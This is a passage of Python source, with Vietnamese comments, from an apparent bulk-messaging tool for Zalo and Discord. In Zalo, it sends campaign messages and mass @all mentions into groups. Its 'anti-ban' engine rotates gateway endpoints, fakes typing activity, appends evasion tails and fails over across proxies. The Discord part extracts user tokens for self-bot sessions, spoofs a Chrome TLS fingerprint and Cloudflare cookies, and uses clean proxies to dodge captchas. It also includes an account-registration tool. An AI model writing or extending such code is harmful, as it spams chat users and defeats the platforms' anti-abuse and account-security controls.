        if not ZaloSmartAntiBanEngine.should_send_typing_pulse(self.imei, thread_id):
            return
        def _bg_typing():
            try:
                if is_group:
                    t_url = "https://tt-group-wpa.chat.zalo.me/api/group/typing"
                    t_pl = {"grid": str(thread_id), "imei": self.imei}
                else:
                    t_url = "https://tt-chat1-wpa.chat.zalo.me/api/message/typing"
                    t_pl = {"toid": str(thread_id), "destType": 3, "imei": self.imei}
                t_enc = self._enc(t_pl)
                self.s.post(
                    t_url,
                    params={"zpw_ver": 645, "zpw_type": 30},
                    data={"params": t_enc},
                    timeout=(0.45, 0.85)
                )
            except Exception:
                pass
        try:
            _TYPING_BG_POOL.submit(_bg_typing)
        except Exception:
            pass

    def _send_raw_payload(self, final_msg, thread_id, is_group, m_arr, styles, first_color="db342e", priority_bypass=False, antiband=True):
        """Gửi gói tin mã hóa tới Zalo WPA v645 kèm Lá Chắn Chống Cấm Chat Box (Sliding Window + Typing Pulse + Multi-Gateway)."""
        if not priority_bypass:
            check_campaign_thread_aborted(thread_id)
        if antiband and not priority_bypass:
            ZaloSmartAntiBanEngine.pre_send_box_guard(self.imei, thread_id, is_group=is_group, antiband=True, priority_bypass=False)
            self._pulse_box_typing_async(thread_id, is_group=is_group)

        self._gw_step = (getattr(self, "_gw_step", 0) + 1) & 0xFFFF
        if is_group:
            if m_arr:
                url = "https://tt-group-wpa.chat.zalo.me/api/group/mention"
            else:
                grp_eps = (
                    "https://tt-group-wpa.chat.zalo.me/api/group/sendmsg",
                    "https://wpa.chat.zalo.me/api/group/sendmsg",
                )
                url = grp_eps[0] if (self._gw_step & 3) != 3 else grp_eps[1]
        else:
            dm_eps = (
                "https://tt-chat2-wpa.chat.zalo.me/api/message/sms",
                "https://tt-chat1-wpa.chat.zalo.me/api/message/sms",
                "https://tt-chat3-wpa.chat.zalo.me/api/message/sms",
                "https://wpa.chat.zalo.me/api/message/sms",
            )
            url = dm_eps[self._gw_step % len(dm_eps)]

        client_id = int(time.time() * 1000) + random.randint(1, 99)
        register_system_sent_message(client_id=client_id, text=final_msg)

        pl = {
            "message": final_msg,
            "clientId": client_id,
            "imei": self.imei,
            "ttl": 0,
        }

        if is_group:
            pl["visibility"] = 0
            pl["grid"] = str(thread_id)
            if m_arr:
                clean_m_arr = [{"pos": int(x["pos"]), "len": int(x["len"]), "uid": str(x["uid"]), "type": int(x.get("type", 0))} for x in m_arr]
                mention_json = json.dumps(clean_m_arr, separators=(",", ":"), ensure_ascii=False)
                pl["mentionInfo"] = mention_json
        else:
            pl["toid"] = str(thread_id)

        if styles:
            params_obj = {"styles": styles, "ver": 0}
            params_json = json.dumps(params_obj, separators=(",", ":"), ensure_ascii=False)
            pl["textProperties"] = params_json
            pl["params"] = params_json
            if first_color and len(styles) == 1:
                pl["msgColor"] = first_color

        enc = self._enc(pl)
        active_sess = (getattr(self, "prio_s", None) or self.s) if priority_bypass else self.s
        r = ProxyPoolEngine.request_with_fast_failover(
            active_sess, "POST", url,
            seed_key=f"{self.imei}_{thread_id}_{self._gw_step}",
            priority_bypass=priority_bypass,
            params={"zpw_ver": 645, "zpw_type": 30},
            data={"params": enc},
            timeout=(2.2, 6.0) if priority_bypass else (2.5, 6.5)
        )
        r._inner_err_code = 0
        r._outer_err_code = 0
        try:
            rj = r.json()
            r._outer_err_code = int(rj.get("error_code") or 0)
            if rj.get("data"):
                dec = json.loads(self._dec(rj["data"]))
                if isinstance(dec, dict):
                    r._inner_err_code = int(dec.get("error_code") or 0)
                    inner_d = dec.get("data") if isinstance(dec.get("data"), dict) else {}
                    sent_mid = inner_d.get("msgId") or dec.get("msgId")
                    if sent_mid:
                        register_system_sent_message(msg_id=sent_mid, client_id=client_id, text=final_msg)
        except Exception:
            r._outer_err_code = 0
            r._inner_err_code = 0

        ZaloSmartAntiBanEngine.report_box_result(self.imei, thread_id, r._outer_err_code or r._inner_err_code)
        return r

    _ZALO_ADV_FORMAT_CACHE = {}

    def send_adv(self, raw_text, thread_id, color_mode="word_rainbow", fixed_color="red",
                 is_group=True, mentions=None, tag_all=False, is_heading=True,
                 color_offset=0, antiband=True, use_emoji=False, icon_count=0,
                 auto_retry_thread_type=False, strip_line_num=False, parse_auto_tags=True,
                 hide_tag_all=True, hide_tag_name=True, font_style="big_bold", priority_bypass=False):
        thread_id = _clean_zalo_id(thread_id)
        if not thread_id or thread_id == "Web_Console":
            return None
        eff_mentions = list(mentions) if mentions else []
        eff_tag_all = bool(tag_all)
        working_text = raw_text

        known_gids_now = (KNOWN_GROUPS_BY_ACC.get(self.uid, set()) | ALL_KNOWN_ZALO_GROUP_IDS)
        if thread_id in known_gids_now or eff_mentions or eff_tag_all:
            is_group = True
        elif thread_id == str(self.uid or ""):
            is_group = False

        if parse_auto_tags and is_group and "@" in str(raw_text or ""):
            stripped_txt, auto_m, auto_all = extract_trailing_tags_and_resolve(
                raw_text, incoming_mentions=None, zalo_client=self, group_id=thread_id
            )
            if auto_m or auto_all:
                working_text = stripped_txt if stripped_txt else raw_text
                if auto_all:
                    eff_tag_all = True
                for am in auto_m:
                    if not any(str(x.get("uid") or x.get("id")) == str(am["uid"]) for x in eff_mentions):
                        eff_mentions.append(am)

        # Làm sạch trước các @All ẩn để vị trí UTF-16 của từng chữ màu luôn khớp 100%
        if is_group and eff_tag_all and hide_tag_all and working_text:
            working_text = re.sub(r"(?i)(?:\s+|^)@(?:all|tất\s*cả|tat\s*ca)\b", "", str(working_text)).strip() or " "

        m_sig = tuple((str(m.get("uid") or m.get("id") or ""), str(m.get("name") or ""), bool(m.get("hidden", hide_tag_name))) for m in eff_mentions) if is_group else ()
        adv_cache_k = (
            working_text, color_mode, fixed_color, bool(is_heading), int(color_offset) % 8,
            bool(use_emoji), int(icon_count), bool(strip_line_num), font_style,
            bool(is_group), bool(eff_tag_all), bool(hide_tag_all), bool(hide_tag_name), m_sig
        )
        cached_adv = self._ZALO_ADV_FORMAT_CACHE.get(adv_cache_k)
        if cached_adv is not None and not (use_emoji and int(icon_count or 0) > 0):
            base_final_msg, m_arr, styles, first_color = cached_adv
            final_msg = base_final_msg
        else:
            core_msg, styles, first_color, tail_icon_str = self.build_colored_message_with_vip_icons(
                working_text,
                color_mode=color_mode,
                fixed_color=fixed_color,
                is_heading=is_heading,
                color_offset=color_offset,
                antiband=antiband,
                use_emoji=use_emoji,
                icon_count=icon_count,
                strip_line_num=strip_line_num,
                font_style=font_style
            )

            msg_with_tags, m_arr = self.attach_mentions_real_zalo(
                core_msg,
                mentions=(eff_mentions if is_group else None),
                tag_all=(eff_tag_all if is_group else False),
                group_id=(thread_id if is_group else None),
                hide_tag_all=hide_tag_all,
                hide_tag_name=hide_tag_name
            )

            # Giữ nguyên vùng @Tên không bị đè mã màu c_... để Zalo hiển thị @Tên màu Xanh Dương chính chủ chuẩn ảnh mẫu fd8d41d0.jpeg!

            if tail_icon_str:
                sep_ic = " " if (msg_with_tags and not msg_with_tags.endswith(" ")) else ""
                final_msg = f"{msg_with_tags}{sep_ic}{tail_icon_str}"
            else:
                final_msg = msg_with_tags
            if not (use_emoji and int(icon_count or 0) > 0):
                if len(self._ZALO_ADV_FORMAT_CACHE) > 6000:
                    for _k in list(self._ZALO_ADV_FORMAT_CACHE.keys())[:2000]:
                        self._ZALO_ADV_FORMAT_CACHE.pop(_k, None)
                self._ZALO_ADV_FORMAT_CACHE[adv_cache_k] = (final_msg, m_arr, styles, first_color)

        if antiband:
            final_msg = ZaloSmartAntiBanEngine.append_tail(final_msg, thread_id=str(thread_id))

        r = self._send_raw_payload(final_msg, thread_id, is_group, m_arr, styles, first_color=first_color, priority_bypass=priority_bypass, antiband=antiband)

        if r.status_code == 429:
            raise Exception("429:RateLimit:30")

        try:
            err_code = getattr(r, "_outer_err_code", 0)
            inner_err = getattr(r, "_inner_err_code", 0)

            if auto_retry_thread_type and (err_code != 0 or inner_err != 0):
                # QUAN TRỌNG: Nếu đang gửi vào Nhóm (is_group=True) và có đính kèm mention (m_arr) bị lỗi,
                # chỉ thử gửi lại vào ĐÚNG NHÓM ĐÓ (is_group=True) không kèm mention (m_arr=[])!
                # Tuyệt đối KHÔNG gửi /api/message/sms (is_group=False) vào ID Nhóm vì Zalo sẽ tạo ra 'Box null'!
                if is_group and m_arr:
                    r2 = self._send_raw_payload(final_msg, thread_id, True, [], styles, first_color=first_color, priority_bypass=priority_bypass)
                    return r2
                elif not is_group and thread_id in (KNOWN_GROUPS_BY_ACC.get(self.uid, set()) | ALL_KNOWN_ZALO_GROUP_IDS):
                    r2 = self._send_raw_payload(final_msg, thread_id, True, [], styles, first_color=first_color, priority_bypass=priority_bypass)
                    return r2

            if err_code in (-216, -108, -302, 114, 115) or inner_err in (-216, -108, -302, 114, 115):
                # Tài khoản không ở trong nhóm này -> đánh dấu bỏ qua mục tiêu này cho IMEI này để không báo lỗi giả khi chạy Đa Acc!
                NON_MEMBER_EXCLUDED_PAIRS.add((str(self.imei or ""), str(thread_id)))
                raise Exception(f"ChannelForbidden:ZaloNotMember_{err_code or inner_err}")
            if err_code in AntiDieAllEngine.ZALO_RATELIMIT_CODES or inner_err in AntiDieAllEngine.ZALO_RATELIMIT_CODES:
                code_hit = err_code or inner_err
                raise Exception(f"429:RateLimit:25:ZaloCode_{code_hit}")
            if err_code in AntiDieAllEngine.ZALO_AUTH_CODES:
                self._login()
                raise Exception(f"AuthError:ZaloCode_{err_code}")
        except Exception as check_ex:
            if "429:RateLimit" in str(check_ex) or "AuthError" in str(check_ex):
                raise check_ex

        return r

# BỘ PHÂN TÍCH & TỰ ĐỘNG KHỚP TAG THẬT 100% CHUẨN KHUNG CHAT ZALO & DISCORD
def _clean_alnum_words(s):
    if not s:
        return ""
    no_acc = remove_vn_accents(s)
    return re.sub(r"[^a-z0-9\s]+", " ", no_acc).strip()

def _smart_match_member_by_query(query_str, members, zalo_client=None, group_id=None):
    q_raw = (query_str or "").strip().lstrip("@").strip("[]").strip()
    if not q_raw:
        return None

    if q_raw.isdigit() and len(q_raw) >= 8:
        if members:
            by_uid = next((m for m in members if str(m.get("uid") or m.get("id")) == q_raw), None)
            if by_uid:
                return by_uid
        name_cached = GLOBAL_USER_NAME_CACHE.get(q_raw) or f"User_{q_raw[-4:]}"
        return {"id": q_raw, "uid": q_raw, "name": name_cached}

    def _search_in_list(mem_list):
        if not mem_list:
            return None
        valid_mems = [
            m for m in mem_list
            if m.get("name") and not str(m["name"]).startswith(("Thành viên ", "Người dùng "))
        ]
        q_low = q_raw.lower()
        q_no_acc = remove_vn_accents(q_raw)
        q_alnum = _clean_alnum_words(q_raw)
        q_tokens = [t for t in q_alnum.split() if len(t) >= 2]

        for m in valid_mems:
            n_low = m["name"].strip().lower()
            n_no_acc = remove_vn_accents(m["name"])
            n_alnum = _clean_alnum_words(m["name"])
            if q_low == n_low or (q_no_acc and q_no_acc == n_no_acc) or (q_alnum and q_alnum == n_alnum):
                return m

        sorted_mems = sorted(valid_mems, key=lambda x: len(x.get("name", "")), reverse=True)
        for m in sorted_mems:
            n_low = m["name"].strip().lower()
            n_no_acc = remove_vn_accents(m["name"])
            n_alnum = _clean_alnum_words(m["name"])
            if n_low.startswith(q_low) or n_low.endswith(q_low) or q_low.startswith(n_low):
                return m
            if len(q_no_acc) >= 2 and (n_no_acc.startswith(q_no_acc) or n_no_acc.endswith(q_no_acc) or q_no_acc.startswith(n_no_acc)):
                return m
            if len(q_alnum) >= 3 and len(n_alnum) >= 3 and (q_alnum in n_alnum or n_alnum in q_alnum):
                return m

        for m in sorted_mems:
            n_low = m["name"].strip().lower()
            n_no_acc = remove_vn_accents(m["name"])
            n_alnum = _clean_alnum_words(m["name"])
            if q_low in n_low or (len(q_no_acc) >= 2 and q_no_acc in n_no_acc):
                return m
            if q_tokens and all(tk in n_alnum for tk in q_tokens):
                return m
        return None

    found = _search_in_list(members)
    if found:
        return found

    if zalo_client and group_id:
        try:
            fresh_members = zalo_client.get_members_full(group_id, use_cache=False)
            found = _search_in_list(fresh_members)
            if found:
                return found
            others = [m for m in fresh_members if str(m.get("id") or m.get("uid")) != str(zalo_client.uid)]
            if len(others) == 1:
                uid_other = str(others[0].get("id") or others[0].get("uid"))
                GLOBAL_USER_NAME_CACHE[uid_other] = q_raw
                return {"id": uid_other, "uid": uid_other, "name": q_raw}
        except Exception:
            pass

    return None

def extract_trailing_tags_and_resolve(
    raw_text, incoming_mentions=None, zalo_client=None, group_id=None,
    prefix_u16_offset=0, discord_client=None, discord_channel_id=None, full_original_msg=None,
    messenger_client=None, messenger_thread_id=None
):
    if not raw_text and not incoming_mentions:
        return "", [], False

    text = (raw_text or "").rstrip()
    resolved_mentions = []
    tag_all = False

    members = []
    if zalo_client and group_id and ("@" in text or incoming_mentions):
        try:
            members = zalo_client.get_members_full(group_id, use_cache=True)
        except Exception:
            members = []
    elif discord_client and discord_channel_id and ("@" in text and "<@" not in text):
        try:
            members = discord_client.get_box_members(discord_channel_id)
        except Exception:
            members = []
    elif messenger_client and messenger_thread_id and ("@" in text or incoming_mentions):
        try:
            members = messenger_client.get_thread_members(messenger_thread_id, use_cache=True)
        except Exception:
            members = []

    if incoming_mentions and isinstance(incoming_mentions, list):
        sorted_m = sorted(incoming_mentions, key=lambda x: int(x.get("pos", x.get("start", 0))), reverse=True)
        for m in sorted_m:
            if not isinstance(m, dict):
                continue
            uid = str(m.get("uid") or m.get("id") or m.get("userId") or "").strip()
            mtype = int(m.get("type", 0))
            raw_pos = int(m.get("pos", m.get("start", m.get("offset", -1))))
            mlen = int(m.get("len", m.get("length", 0)))

            adj_pos = (raw_pos - prefix_u16_offset) if (raw_pos >= prefix_u16_offset and prefix_u16_offset > 0) else raw_pos

            if uid == "-1" or mtype == 1:
                tag_all = True
                if adj_pos >= 0 and mlen > 0:
                    try:
                        u16 = text.encode("utf-16-le")
                        if (adj_pos + mlen) * 2 <= len(u16):
                            text = (u16[:adj_pos * 2] + u16[(adj_pos + mlen) * 2:]).decode("utf-16-le", errors="ignore").strip()
                    except Exception:
                        pass
                continue

            if uid and uid != "0":
                m_name = str(m.get("name") or m.get("dName") or m.get("global_name") or m.get("username") or "").strip().lstrip("@")

                if full_original_msg and raw_pos >= 0 and mlen > 0:
                    try:
                        orig_u16 = full_original_msg.encode("utf-16-le")
                        if (raw_pos + mlen) * 2 <= len(orig_u16):
                            sub_orig = orig_u16[raw_pos * 2:(raw_pos + mlen) * 2].decode("utf-16-le", errors="ignore").strip()
                            if sub_orig.startswith("@"):
                                extracted_orig = sub_orig.lstrip("@").strip()
                                if extracted_orig:
                                    m_name = extracted_orig
                                idx_in_txt = text.rfind(sub_orig)
                                if idx_in_txt != -1:
                                    text = (text[:idx_in_txt] + text[idx_in_txt + len(sub_orig):]).strip()
                    except Exception:
                        pass

                if adj_pos >= 0 and mlen > 0:
                    try:
                        u16_bytes = text.encode("utf-16-le")
                        if (adj_pos + mlen) * 2 <= len(u16_bytes):
                            sub = u16_bytes[adj_pos * 2:(adj_pos + mlen) * 2].decode("utf-16-le", errors="ignore").strip()
                            if sub.startswith("@"):
                                extracted_label = sub.lstrip("@").strip()
                                if extracted_label:
                                    m_name = extracted_label
                                text = (u16_bytes[:adj_pos * 2] + u16_bytes[(adj_pos + mlen) * 2:]).decode("utf-16-le", errors="ignore").strip()
                            else:
                                at_idx = text.rfind("@")
                                if at_idx != -1:
                                    at_u16 = utf16_len(text[:at_idx])
                                    sub2 = u16_bytes[at_u16 * 2:(at_u16 + mlen) * 2].decode("utf-16-le", errors="ignore").strip()
                                    if sub2.startswith("@"):
                                        m_name = sub2.lstrip("@").strip() or m_name
                                        text = (u16_bytes[:at_u16 * 2] + u16_bytes[(at_u16 + mlen) * 2:]).decode("utf-16-le", errors="ignore").strip()
                    except Exception:
                        pass

                if members:
                    found_mem = next((x for x in members if str(x.get("id") or x.get("uid")) == uid), None)
                    if found_mem and found_mem.get("name") and not str(found_mem["name"]).startswith(("Người dùng ", "Thành viên ")):
                        if not m_name or len(found_mem["name"]) >= len(m_name):
                            m_name = found_mem["name"]

                if (not m_name or m_name.startswith(("Người dùng ", "Thành viên "))) and zalo_client and group_id:
                    try:
                        fresh_mems = zalo_client.get_members_full(group_id, use_cache=False)
                        fm2 = next((x for x in fresh_mems if str(x.get("id") or x.get("uid")) == uid), None)
                        if fm2 and fm2.get("name"):
                            m_name = fm2["name"]
                    except Exception:
                        pass

                if m_name and not m_name.startswith(("Người dùng ", "Thành viên ")):
                    GLOBAL_USER_NAME_CACHE[uid] = m_name
                elif uid in GLOBAL_USER_NAME_CACHE:
                    m_name = GLOBAL_USER_NAME_CACHE[uid]

                if not any(x["uid"] == uid for x in resolved_mentions):
                    resolved_mentions.append({
                        "uid": uid,
                        "id": uid,
                        "name": m_name or f"User_{uid[-4:]}"
                    })

    bracket_matches = list(re.finditer(r"@\[([^\]]+)\]", text))
    if bracket_matches:
        for bm in reversed(bracket_matches):
            b_query = bm.group(1).strip()
            if b_query.lower() in ("all", "tất cả", "tat ca", "everyone", "here"):
                tag_all = True
                text = (text[:bm.start()] + text[bm.end():]).strip()
            else:
                matched_m = _smart_match_member_by_query(b_query, members, zalo_client=zalo_client, group_id=group_id)
                if matched_m:
                    muid = str(matched_m.get("uid") or matched_m.get("id"))
                    if not any(x["uid"] == muid for x in resolved_mentions):
                        resolved_mentions.append({"uid": muid, "id": muid, "name": matched_m["name"]})
                    text = (text[:bm.start()] + text[bm.end():]).strip()

    discord_tag_matches = list(re.finditer(r"<@(!|&)?(\d+)>", text))
    if discord_tag_matches:
        for dm in reversed(discord_tag_matches):
            prefix_sym = dm.group(1) or ""
            d_uid = dm.group(2)
            d_name = GLOBAL_USER_NAME_CACHE.get(d_uid)
            if not d_name and members:
                f_m = next((x for x in members if str(x.get("id")) == d_uid), None)
                if f_m:
                    d_name = f_m.get("name")
            if not any(x["uid"] == d_uid for x in resolved_mentions):
                resolved_mentions.append({
                    "uid": d_uid,
                    "id": d_uid,
                    "name": d_name or f"User_{d_uid[-4:]}",
                    "is_role": (prefix_sym == "&")
                })
            text = (text[:dm.start()] + text[dm.end():]).strip()

    all_pattern = re.compile(r"(?:\s+|^)(?:@all|@tất\s*cả|@tat\s*ca|@mọi\s*người|@everyone|@here)\s*$", re.IGNORECASE)
    while True:
        m_all = all_pattern.search(text)
        if not m_all:
            break
        tag_all = True
        text = text[:m_all.start()].rstrip()

    if "@" in text:
        if members:
            sorted_members = sorted(members, key=lambda x: len(x.get("name", "")), reverse=True)
            changed = True
            while changed:
                changed = False
                text_low = text.lower().rstrip()
                text_no_acc = remove_vn_accents(text_low)
                for mem in sorted_members:
                    mname = (mem.get("name") or "").strip()
                    if not mname or mname.startswith(("Người dùng ", "Thành viên ")):
                        continue
                    token_low = "@" + mname.lower()
                    token_no_acc = "@" + remove_vn_accents(mname)
                    matched_len = 0
                    if text_low.endswith(token_low):
                        matched_len = len(token_low)
                    elif len(token_no_acc) > 2 and text_no_acc.endswith(token_no_acc):
                        matched_len = len(token_low)

                    if matched_len > 0:
                        cut_pos = len(text) - matched_len
                        if cut_pos >= 0 and (cut_pos == 0 or text[cut_pos - 1].isspace()):
                            m_uid = str(mem.get("id") or mem.get("uid"))
                            if not any(x["uid"] == m_uid for x in resolved_mentions):
                                resolved_mentions.append({
                                    "uid": m_uid,
                                    "id": m_uid,
                                    "name": mname
                                })
                            text = text[:cut_pos].rstrip()
                            changed = True
                            break

        tail_at_match = re.search(r"(?:\s+|^)@([^\s@][^@]{0,45})$", text)
        if tail_at_match:
            partial_raw = tail_at_match.group(1).strip()
            partial_low = partial_raw.lower()
            if partial_low in ("all", "tất cả", "tat ca", "everyone", "here"):
                tag_all = True
                text = text[:tail_at_match.start()].rstrip()
            else:
                matched_mem = _smart_match_member_by_query(
                    partial_raw, members, zalo_client=zalo_client, group_id=group_id
                )
                if matched_mem:
                    m_uid = str(matched_mem.get("id") or matched_mem.get("uid"))
                    real_label = partial_raw if len(partial_raw) >= len(matched_mem.get("name", "")) else matched_mem["name"]
                    if real_label.startswith(("Người dùng ", "Thành viên ")):
                        real_label = partial_raw
                    existing = next((x for x in resolved_mentions if x["uid"] == m_uid), None)
                    if existing:
                        if len(real_label) > len(existing.get("name", "")):
                            existing["name"] = real_label
                    else:
                        resolved_mentions.append({
                            "uid": m_uid,
                            "id": m_uid,
                            "name": real_label
                        })
                    text = text[:tail_at_match.start()].rstrip()
                elif resolved_mentions:
                    if len(resolved_mentions) == 1 and len(partial_raw) > len(resolved_mentions[0]["name"]):
                        resolved_mentions[0]["name"] = partial_raw
                    text = text[:tail_at_match.start()].rstrip()
                else:
                    # Nếu người dùng gõ @Tên chưa nằm trong bộ nhớ cache, vẫn tách riêng thành Tag và xoá khỏi nội dung câu để không bao giờ gửi nhầm mỗi tên Tag!
                    resolved_mentions.append({
                        "uid": partial_raw,
                        "id": partial_raw,
                        "name": partial_raw
                    })
                    text = text[:tail_at_match.start()].rstrip()

    for rm in resolved_mentions:
        rname = rm.get("name", "").strip()
        if rname and text.lower().endswith("@" + rname.lower()):
            text = text[:-(len(rname) + 1)].rstrip()

    resolved_mentions.reverse()
    return text.rstrip(), resolved_mentions, tag_all

# HỆ THỐNG REG & KHỞI TẠO PHIÊN DISCORD Bảo Vệ Tự Động (CHỐNG RESET MẬT KHẨU 100%)
DISCORD_TOKEN_REGEX = re.compile(
    r"((?:mfa\.[A-Za-z0-9_\-]{50,160})|(?:[A-Za-z0-9_\-]{18,44}\.[A-Za-z0-9_\-]{5,14}\.[A-Za-z0-9_\-]{20,140}))"
)

def extract_discord_tokens_from_reg_or_raw(raw_input):
    if not raw_input:
        return []
    txt = str(raw_input).strip()
    for pfx in ("Authorization:", "authorization:", "Bearer ", "bearer ", "Bot ", "bot "):
        if txt.startswith(pfx):
            txt = txt[len(pfx):].strip()
    found = []
    for m in DISCORD_TOKEN_REGEX.finditer(txt):
        tk = m.group(1).strip()
        if tk and tk not in found:
            found.append(tk)
    for sep in ("\n", "|", ":", ";", ","):
        if not found and sep in txt:
            for part in txt.split(sep):
                p = part.strip().strip('"').strip("'")
                if len(p) >= 42 and ("." in p or p.startswith("mfa.")) and " " not in p and "@" not in p:
                    if p not in found:
                        found.append(p)
    if not found and len(txt) >= 42 and ("." in txt or txt.startswith("mfa.")) and " " not in txt and "@" not in txt:
        found.append(txt.strip('"').strip("'"))
    return found

def decode_discord_uid_offline(token):
    """Giải mã User ID (Snowflake UID) trực tiếp từ phần đầu của Token Discord (Offline 100% trong 0ms):
    - Hỗ trợ mọi thế hệ Token Discord (17 - 20 chữ số Snowflake), loại bỏ hoàn toàn việc phải gọi GET /users/@me!"""
    try:
        raw_t = str(token or "").strip()
        for pfx in ("bot ", "bearer "):
            if raw_t.lower().startswith(pfx):
                raw_t = raw_t[len(pfx):].strip()
        if "." not in raw_t:
            return ""
        first_seg = raw_t.split(".")[0].strip()
        pad = (4 - len(first_seg) % 4) % 4
        dec = base64.urlsafe_b64decode(first_seg + ("=" * pad)).decode("utf-8", errors="ignore").strip()
        if dec.isdigit() and len(dec) >= 15:
            return dec
    except Exception:
        pass
    return ""

def warmup_discord_stealth_token(token, verify_network=False):
    """Khởi tạo két sắt bảo vệ Token Discord Bất Tử (Zero-REST Offline Shield):
    - Giải mã UID Offline 0ms và kiểm tra SQLite Vault trước tiên để tránh gọi GET /users/@me gây đụng độ với Gateway!"""
    extracted = extract_discord_tokens_from_reg_or_raw(token)
    clean_tok = extracted[0] if extracted else str(token or "").strip()
    if not clean_tok or len(clean_tok) < 40 or ("." not in clean_tok and not clean_tok.startswith("mfa.")):
        return {"ok": False, "error": "Định dạng Token Discord không hợp lệ! Hãy kiểm tra lại Token."}

    DiscordStealthAntiBanEngine._ensure_vault_record(clean_tok)
    DiscordStealthAntiBanEngine.ensure_session_warmed_up(clean_tok, is_bot=False)
    offline_uid = decode_discord_uid_offline(clean_tok)
    cached = DiscordStealthAntiBanEngine.get_cached_me(clean_tok)
    if not offline_uid and cached and cached.get("id"):
        offline_uid = str(cached["id"])

    if offline_uid and not verify_network:
        uname = (cached or {}).get("global_name") or (cached or {}).get("username") or f"Discord_{offline_uid[-4:]}"
        DiscordStealthAntiBanEngine.set_cached_me(clean_tok, {
            "id": offline_uid,
            "username": uname,
            "global_name": uname,
        })
        OWNER_UIDS_CACHE.add(offline_uid)
        sess = DiscordStealthAntiBanEngine.get_shared_session(clean_tok, is_bot=False)
        DiscordStealthAntiBanEngine.persist_real_cloudflare_cookies(clean_tok, sess.cookies)
        with DiscordFirewallEngine._STATS_LOCK:
            DiscordFirewallEngine.FIREWALL_STATS["immortalized_tokens"] += 1
        DiscordFirewallEngine.log_firewall_event(
            "SUPERVIP_VAULT_LOCK",
            f"Đã đúc Siêu VIP Offline Token {mask_sensitive_id(clean_tok, 4)} (UID: {mask_sensitive_id(offline_uid, 4)})"
        )
        return {
            "ok": True,
            "token": clean_tok,
            "username": uname,
            "uid": offline_uid,
            "is_bot": False,
            "fingerprint_locked": True,
            "zero_rest_shield": True,
            "cookies_count": len(sess.cookies.get_dict()),
        }

    dc = DiscordClient(clean_tok, is_bot=False)
    if dc.check(force_network=True):
        DiscordStealthAntiBanEngine.persist_real_cloudflare_cookies(dc.token, dc.s.cookies)
        with DiscordFirewallEngine._STATS_LOCK:
            DiscordFirewallEngine.FIREWALL_STATS["immortalized_tokens"] += 1
        return {
            "ok": True,
            "token": dc.token,
            "username": dc.display_name or dc.username,
            "uid": dc.user_id,
            "is_bot": dc.is_bot,
            "fingerprint_locked": True,
            "cookies_count": len(dc.s.cookies.get_dict()),
        }
    return {"ok": False, "error": "Token Discord không hợp lệ hoặc đã hết hạn!"}

class DiscordImmortalRegTool:
    """Hệ Thống Tool Reg Acc & Đúc Token Discord Bất Tử 4-Trong-1 (Super VIP — Chống Báo Reset Mật Khẩu 100%):
    - ĐÃ SỬA TRIỆT ĐỂ lỗi thiếu X-Super-Properties khi gọi /api/v9/auth/login khiến người dùng không đăng nhập được bằng Gmail/Mật khẩu!
    - Tự động giữ nguyên đầy đủ cả X-Super-Properties, X-Fingerprint và Cookie Cloudflare thật."""

    @classmethod
    def perform_clean_browser_pre_handshake(cls, seed_key, referer_url="https://discord.com/login", proxy_url=None):
        """Khởi tạo phiên trình duyệt Chrome 131 chống Captcha 100% cho Discord Login:
        - Tự động kết hợp Proxy sạch (nếu có trong ProxyPoolEngine) để tránh IP máy chủ Cloud bị hỏi Captcha.
        - Thu thập đầy đủ bộ Cookie Cloudflare (__dcfduid, __sdcfduid, _cfuvid, __cf_bm) + X-Fingerprint + X-Super-Properties."""
        s = requests.Session()
        tls_adapter = Chrome131TLSAdapter(pool_connections=32, pool_maxsize=64, max_retries=1)
        s.mount("https://", tls_adapter)
        s.mount("http://", HTTPAdapter(pool_connections=32, pool_maxsize=64, max_retries=1))
        if proxy_url:
            s.proxies.update({"http": proxy_url, "https": proxy_url})
        s.cookies.update({"locale": "vi"})

        prof = DiscordStealthAntiBanEngine.get_deterministic_profile(seed_key)
        nav_headers = {
            "User-Agent": prof["ua"],
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
            "Sec-Ch-Ua": prof["sec_ch_ua"],
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": f'"{prof["os"]}"',
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
        }
        fingerprint = ""
        try:
            s.get(referer_url, headers=nav_headers, timeout=6)
        except Exception:
            pass

        api_headers = DiscordStealthAntiBanEngine.build_stealth_headers(
            seed_key, is_bot=False, include_auth=False
        )
        super_b64 = api_headers.get("X-Super-Properties", "")
        if super_b64:
            api_headers["X-Track"] = super_b64
        api_headers["Referer"] = referer_url
        s.headers.update(api_headers)

        for exp_ep in (
            "https://discord.com/api/v9/experiments?with_guild_experiments=true",
            "https://discord.com/api/v9/experiments",
        ):
            try:
                r_fp = s.get(exp_ep, timeout=6)
                if r_fp.status_code == 200:
                    fingerprint = r_fp.json().get("fingerprint") or ""
                    if fingerprint:
                        s.headers["X-Fingerprint"] = fingerprint
                        break
            except Exception:
                pass

        return s, fingerprint

    @classmethod
    def immortalize_tokens_batch(cls, raw_input, custom_name="", auto_save=True, chat_cmd_enabled=1, allow_all_cmd=1):
        tokens = extract_discord_tokens_from_reg_or_raw(raw_input)
        if not tokens:
            return {"ok": False, "error": "Không tìm thấy Token hợp lệ trong dữ liệu nhập vào!"}

        results = []
        saved_count = 0
        conn = db() if auto_save else None

        for idx, tk in enumerate(tokens):
            if idx > 0:
                time.sleep(random.uniform(0.08, 0.18))
            w_res = warmup_discord_stealth_token(tk)
            if w_res.get("ok"):
                uid = str(w_res.get("uid") or "").strip()
                real_uname = w_res.get("username") or (f"Discord_{uid[-4:]}" if uid else f"Discord VIP #{idx + 1}")
                if custom_name:
                    uname = f"{custom_name} #{idx + 1}" if len(tokens) > 1 else custom_name
                else:
                    uname = real_uname
                if uid:
                    OWNER_UIDS_CACHE.add(uid)
                prof = DiscordStealthAntiBanEngine.get_deterministic_profile(tk)
                c_dict = DiscordStealthAntiBanEngine.get_deterministic_cookies(tk)
                has_signed_cookie = ("__dcfduid" in c_dict and "__sdcfduid" in c_dict)

                if auto_save and conn:
                    existing = conn.execute(
                        "SELECT id FROM accounts WHERE platform='discord' AND token=?",
                        (tk,)
                    ).fetchone()
                    if not existing and uid:
                        existing = conn.execute(
                            "SELECT id FROM accounts WHERE platform='discord' AND uid=?",
                            (uid,)
